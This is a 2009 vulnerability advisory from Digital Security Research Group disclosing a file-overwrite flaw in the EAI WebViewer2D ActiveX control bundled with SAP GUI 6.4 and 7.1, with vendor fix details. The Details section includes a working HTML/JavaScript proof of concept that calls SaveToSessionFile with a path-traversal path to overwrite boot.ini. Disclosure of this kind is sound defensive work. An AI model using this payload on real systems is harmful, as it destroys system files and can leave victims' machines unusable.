
Date: Mon, 28 Sep 2009 12:42:48 +0400
From: Alexandr Polyakov <alexandr.polyakov@...c.ru>
To: bugtraq@...urityfocus.com, vuln@...unia.com,
	packet@...ketstormsecurity.org
Subject: [DSECRG-09-043] SAP GUI 7.1 Insecure Method

Digital Security Research Group [DSecRG] Advisory       #DSECRG-09-043


Application:                    EAI WebViewer2D  (EnjoySAP, SAP GUI for Windows 6.4 and 7.1)    
Versions Affected:              Tested on 7100.2.7.1038 PL 7
Vendor URL:                     http://SAP.com
Bugs:                           insecure method, File owervriting
Exploits:                       YES
Reported:                       02.07.2009
Vendor response:                02.07.2009
Date of Public Advisory:        28.09.2009      
CVE-number:                     
Author:                         Alexandr Polyakov 
                                Digital Security Research Group [DSecRG] (research [at] dsecrg [dot] com)



Description
***********

SAP GUI for Windows 7.1 and 6.4 contains ActiveX component EAI WebViewer2D ( file WebViewer2D.dll) Lib GUID:    {A76CEBEE-7364-11D2-AA6B-00E02924C34E}

which is contains insecure method that can overwrite any file in system. 

Details
*******

Attacker can construct html page which call  vulnerable function  SaveToSessionFile from ActiveX component EAI WebViewer2D



Example1:

<HTML>
<BODY>
 <object id=ctrl classid="clsid:{A76CEBEE-7364-11D2-AA6B-00E02924C34E}"></object>
<SCRIPT>
function Do_1t()
 {
   File = "../../../../../../../../../../../../boot.ini"
   ctrl.SaveToSessionFile(File)
 }
</SCRIPT>
<input language=JavaScript onclick=Do_1t() type=button value="P0c">
</BODY>
</HTML>



For example we can overwrite boot.ini file or  sapgui.ini which contains all connectionbs to sap servers 


Fix Information
***************
The security issue is addressed with SAP note 1372153.

"the methods given in the message have been changed recently to           
immediately return and they do nothing."

References
**********

http://dsecrg.com/pages/vul/show.php?id=143
https://service.sap.com/sap/support/notes/1372153.


About
*****

Digital Security is one of the leading IT security companies in CEMEA, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.


Contact:        research [at] dsecrg [dot] com
                http://www.dsecrg.com











Polyakov Alexandr
Information Security Analyst
______________________
DIGITAL SECURITY
phone:  +7 812 703 1547
        +7 812 430 9130
e-mail: a.polyakov@...c.ru  
www.dsec.ru


-----------------------------------
This message and any attachment are confidential and may be privileged or otherwise protected 
from disclosure. If you are not the intended recipient any use, distribution, copying or disclosure 
is strictly prohibited. If you have received this message in error, please notify the sender immediately 
either by telephone or by e-mail and delete this message and any attachment from your system. Correspondence 
via e-mail is for information purposes only. Digital Security neither makes nor accepts legally binding 
statements by e-mail unless otherwise agreed. 
-----------------------------------      

